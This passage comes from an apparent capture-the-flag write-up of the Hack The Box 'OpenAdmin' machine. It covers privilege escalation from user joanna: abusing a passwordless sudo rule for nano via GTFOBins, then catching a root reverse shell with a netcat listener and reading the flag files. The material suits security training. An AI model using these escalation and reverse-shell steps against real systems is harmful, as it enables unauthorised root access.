Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
```

# Now we are as the user joanna, we enumerate the system to find the way to get the root.

Here's something interesting:
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

We have SUID permissions on the nano binary, we can look up how to abuse this binary in [GTFOBins](https://gtfobins.github.io/).
![](/assets/images/htb-writeup-openadmin/gtfo-nano.png)


I'll use the first option

![](/assets/images/htb-writeup-openadmin/gtfo-nano-shell.png)

```
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```
![](/assets/images/htb-writeup-openadmin/nano-exploited.png)

![](/assets/images/htb-writeup-openadmin/send-bash.png)

```
nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.171] 43582
root@openadmin:/home/joanna# whoami
whoami
root
```

```
root@openadmin:/# cat /home/joanna/user.txt
ae16aeddab..

root@openadmin:/# cat /root/root.txt
b640cba406..
```

# Thanks for reading! This is my first write-up and day by day I will be improving the new ones.
